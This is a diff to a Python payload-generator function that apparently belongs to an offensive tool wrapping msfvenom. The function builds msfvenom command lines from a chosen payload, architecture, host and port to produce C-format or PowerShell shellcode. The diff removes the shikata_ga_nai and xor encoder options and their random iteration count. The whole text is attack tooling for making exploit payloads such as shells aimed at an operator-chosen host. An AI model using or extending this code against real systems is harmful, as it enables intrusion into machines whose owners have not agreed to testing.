@@ -788,8 +788,6 @@ def payload_advisor(payload,module_choice):
 
 def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
     py_version=platform.python_version()    
-
-    Randiter = str(random.randint(1,2))
     platform == ""
  
 
@@ -815,7 +813,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -824,7 +822,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
                     if arch == "x64":
 
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -835,11 +833,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     if arch == "x64":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
             if payload_format == "psh":
 
@@ -869,7 +867,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
                     if arch == "x86":
 
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  
 
@@ -877,7 +875,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x64":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -887,11 +885,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
 
                     if arch == "x64":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
 
 
 
@@ -928,7 +926,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
                     if arch == "x86":
 
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  
 
@@ -936,7 +934,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x64":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -946,11 +944,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                     if arch == "x64":
 
-                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 
 
 
@@ -980,7 +978,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']                        
 
@@ -988,7 +986,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x64":
 
-                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter]
+                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest']
                         ARGs += CustomOpt
                         ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']
 
@@ -998,11 +996,11 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     if arch == "x86":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'])
 
                     if arch == "x64":
 
-                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-b','\'\\x00\\x0a\\x0d\'','-f','c'])
 
             if payload_format == "psh":
 
